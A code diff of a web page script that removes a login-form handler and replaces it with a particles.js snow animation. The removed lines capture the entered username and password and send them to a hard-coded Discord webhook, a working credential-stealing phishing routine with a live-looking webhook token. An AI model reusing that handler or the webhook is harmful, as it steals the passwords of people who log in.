@@ -1,42 +1,64 @@
-// Handle password visibility toggle
-document.getElementById("togglePassword")?.addEventListener("click", function () {
-    const passwordInput = document.getElementById("password");
-    const type = passwordInput.type === "password" ? "text" : "password";
-    passwordInput.type = type;
-    this.textContent = type === "password" ? "👁️" : "🚫";
-});
-
-// Handle form submission for Login
-document.getElementById("loginForm")?.addEventListener("submit", function (event) {
-    event.preventDefault();
-
-    const username = document.getElementById("username").value;
-    const password = document.getElementById("password").value;
-
-    const data = {
-        username: username,
-        password: password
-    };
-
-    fetch("https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
+document.addEventListener('DOMContentLoaded', function () {
+  const script = document.createElement('script');
+  script.src = 'https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js';
+  script.onload = function () {
+    particlesJS("snow", {
+      "particles": {
+        "number": {
+          "value": 40,
+          "density": {
+            "enable": true,
+            "value_area": 800
+          }
         },
-        body: JSON.stringify({
-            embeds: [
-                {
-                    title: "User Logged In",
-                    description: `User: ${data.username} has logged in with the password: ${data.password}`,
-                    color: 16777215
-                }
-            ]
-        })
-    })
-    .then(response => response.json())
-    .then(data => console.log('Success:', data))
-    .catch((error) => console.error('Error:', error));
-
-    // Reset the form after submission
-    document.getElementById("loginForm").reset();
+        "color": {
+          "value": "#ffffff"
+        },
+        "opacity": {
+          "value": 0.7,
+          "random": true,
+          "anim": {
+            "enable": true
+          }
+        },
+        "size": {
+          "value": 2.3,
+          "random": true,
+          "anim": {
+            "enable": true
+          }
+        },
+        "line_linked": {
+          "enable": false
+        },
+        "move": {
+          "enable": true,
+          "speed": 5,
+          "direction": "bottom",
+          "random": true,
+          "straight": false,
+          "out_mode": "out",
+          "bounce": false,
+          "attract": {
+            "enable": true,
+            "rotateX": 300,
+            "rotateY": 1200
+          }
+        }
+      },
+      "interactivity": {
+        "events": {
+          "onhover": {
+            "enable": false
+          },
+          "onclick": {
+            "enable": true
+          },
+          "resize": false
+        }
+      },
+      "retina_detect": true
+    });
+  };
+  document.head.append(script);
 });
